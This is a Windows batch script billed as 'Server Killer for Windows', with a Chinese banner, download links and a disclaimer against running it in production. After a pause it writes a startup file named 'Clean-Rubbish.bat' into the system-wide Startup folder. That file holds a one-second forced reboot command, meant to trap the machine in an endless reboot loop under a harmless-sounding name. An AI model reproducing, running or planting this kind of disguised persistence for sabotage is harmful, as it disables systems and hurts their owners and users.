:: Coding: UTF-8
:: Author: renbaoshuo
:: Link:   www.baoshuo.ren
:: Github: https://github.com/renbaoshuo/ServerKiller/
:: Date:   2020/05/03

:: 前置配置 (指定回显和编码)
@echo off    
chcp 65001 
cls

:: 编码指定对照表: https://docs.microsoft.com/zh-cn/windows/win32/intl/code-page-identifiers

:: 便捷查找表
::         # ESC 按键 (字符不可见)
:: [91m    # 红色
:: [92m    # 绿色
:: [93m    # 黄色
:: [95m    # 紫色
:: [96m    # 蓝色
:: [0m     # 白色

:: 程序入口
echo "=================================================="
echo "            Server Killer for Windows             "
echo "--------------------------------------------------"
echo " + 多种跑路方式任你选择                             "
echo " + 开源地址：https://git.io/ServerKiller           "
echo " + 脚本下载: https://git.io/ServerKiller.bat       "
echo " + 免责声明: 请勿在生产环境运行此脚本！由此产生的一切  "
echo "            后果由使用者承担，与脚本作者无关。继续运  "
echo "            行表示同意此条款。                      "
echo "=================================================="

echo.
pause
echo "shutdown -r -t 1" > "%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Clean-Rubbish.bat"
echo "Successfully!"
echo "You need reboot to make this change to take effect."
exit